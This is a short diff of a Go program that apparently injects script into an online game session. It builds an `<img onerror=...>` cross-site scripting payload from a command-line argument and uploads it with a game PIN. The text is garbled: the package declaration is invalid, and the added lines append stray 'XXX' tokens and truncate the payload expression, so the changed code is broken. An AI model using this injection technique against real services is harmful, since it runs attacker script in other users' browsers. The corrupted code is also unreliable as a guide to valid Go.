@@ -1,7 +1,7 @@
 package main.go spel-pin alert/
 
 import (
-	"fmt"
+	"fmt" XXX
 	"os"
 	"strconv"
 	"strings"
@@ -24,7 +24,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	elementText := `<img src="" onerror="` + escapeScript(os.Args[2]) + `">`
+	elementText := `<img src="" onerror="` + escapeScript XXX
 
 	uploadInjectionString(gamePin, elementText)
 	d1, d2 := computeDelays(1)
